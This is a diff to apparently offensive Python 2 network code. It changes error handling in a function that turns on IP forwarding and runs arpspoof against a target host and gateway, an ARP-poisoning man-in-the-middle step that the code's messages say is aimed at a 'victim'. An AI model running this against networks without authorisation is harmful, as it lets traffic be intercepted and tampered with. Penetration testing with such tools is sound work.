@@ -77,10 +77,15 @@ def arpp(run):
             d.run()
             try:
                 print " "+Alr+" Ensure the victim recieves packets by forwarding them",ping.status_cmd('echo 1 > /proc/sys/net/ipv4/ip_forward','\t')
-                print " "+Alr+" Starting ARP Poisoning."
-                os.system("arpspoof -i "+defaultint+" -t "+defaultipv+" -r "+defaultgat)
+                print " "+Alr+" Starting ARP Poisoning..."
+                try:
+                    os.system("arpspoof -i "+defaultint+" -t "+defaultipv+" -r "+defaultgat)
+                except:
+                    print " "+Alr+" Stopping ARP Poisoning..."
+                    print " "+Alr+" forwarding in 0",ping.status_cmd('echo 0 > /proc/sys/net/ipv4/ip_forward','\t\t\t')
+                    Errors.Errors(event=sys.exc_info()[0], info=False)
             except:
-                Errors.Errors(event=sys.exc_info(), info=False)
+                Errors.Errors(event=sys.exc_info()[0], info=False)
         else:
             d.No_actions()
     except:
